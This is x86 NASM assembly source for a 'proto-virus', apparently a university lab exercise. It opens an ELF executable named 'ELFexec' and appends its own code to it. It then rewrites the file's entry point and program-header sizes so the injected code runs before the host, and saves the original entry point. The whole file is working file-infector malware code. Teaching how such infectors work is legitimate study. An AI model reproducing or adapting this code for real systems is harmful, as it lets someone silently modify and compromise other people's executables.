%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here

	call get_my_loc
	sub edx, next_i - OutStr
	mov ebx, edx
	write 1, ebx, 31

	mov edx, 0

	call get_my_loc
	sub edx, next_i - FileName
	mov ebx, edx
	open ebx, 2, 0777

	mov dword[ebp - 16], eax 		
	cmp eax, -1
    jg infect

	call get_my_loc
	sub edx, next_i - PreviousEntryPoint
	jmp dword[edx]

infect:
	sub ebp, 8
	read eax, ebp, 4
	add ebp, 8

	cmp dword[ebp - 8], 0x464c457f 
	jne error

	;;;;;;file descriptor of end of file
	mov eax, dword[ebp - 16]
	lseek eax, 0, SEEK_END
	mov	dword[ebp - 20], eax

	cmp dword[ebp - 16], eax
	je error


	;;;;;;;writing virus at the end of the file
	call get_my_loc
	sub edx, next_i - _start
	mov ecx, edx
	mov edx, virus_end - _start
	mov eax, dword[ebp - 16]
	write eax, ecx, edx 

	cmp eax, 0
	je error
	cmp eax, -1
	je error

	;;;;;;;restoring file descreptor
	mov eax, dword[ebp - 16]
	lseek eax, 0, SEEK_SET			  

	;;;;;;;;;;reading file header
	mov eax, dword[ebp - 16]
	sub ebp, 80
	read eax, ebp, 52
	add ebp, 80

	;;;;;;;;keeping previous entry point
	mov eax, dword[ebp - 80 + ENTRY]
	mov dword[ebp - 4], eax

	;;;;;start of program header
	mov ebx, dword[ebp - 80 + PHDR_start]
	;;;;;;;;;;second phdr
	add ebx, PHDR_size

	;;;;;;;;;;restoring file descreptor
	mov eax, dword[ebp - 16]
	lseek eax, ebx, SEEK_SET

	;;;;;;;;;;;;;;;read  program header
	mov eax, dword[ebp - 16]
	sub ebp, 120
	read eax, ebp, 32
	add ebp, 120

	;;;;;;;;;;;update the entry point
	mov ecx, dword[ebp - 120 + PHDR_vaddr]
	sub ecx, dword[ebp - 120 + PHDR_offset]
	add ecx, dword[ebp - 20]
	mov dword[ebp - 80 + ENTRY], ecx


	mov eax, dword[ebp - 16]
	lseek eax, 0, SEEK_SET

	mov eax, dword[ebp - 16]
	mov ebx, ebp
	sub ebx, 80
	write eax, ebx, 52 

	mov eax, dword[ebp - 20]
	sub eax, dword[ebp - 120 + PHDR_offset]
	add eax, virus_end
	sub eax, _start

	mov dword[ebp - 120 + PHDR_memsize], eax
	mov dword[ebp - 120 + PHDR_filesize], eax

	mov eax, dword[ebp - 16]
	mov ebx, dword[ebp - 80 + PHDR_start]
	add ebx, PHDR_size
	lseek eax, ebx, SEEK_SET

	mov eax, dword[ebp - 16]
	mov ebx, ebp
	sub ebx, 120
	write eax, ebx, 32 



	;;;;;;;;get file descriptor to end of code
	mov eax, dword[ebp - 16]
	lseek eax, -4, SEEK_END

	;;;;;;load this file descriptor to end of code
	mov ebx, ebp
	sub ebx, 4
	mov eax, dword[ebp - 16]
	write eax, ebx, 4

	mov ecx, dword[ebp - 16]
	close ecx

	jmp VirusExit

VirusExit:
    exit 0            ; Termination if all is OK and no previous code to jump to
                      ; (also an example for use of above macros)
error:
	call get_my_loc
	sub edx, next_i - Failstr
	mov ecx, edx
	mov edx, 12
	write 1, ecx, edx
	exit 1

get_my_loc:
	call next_i

next_i:
	pop edx
	ret



FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0
	
PreviousEntryPoint: dd VirusExit
virus_end:



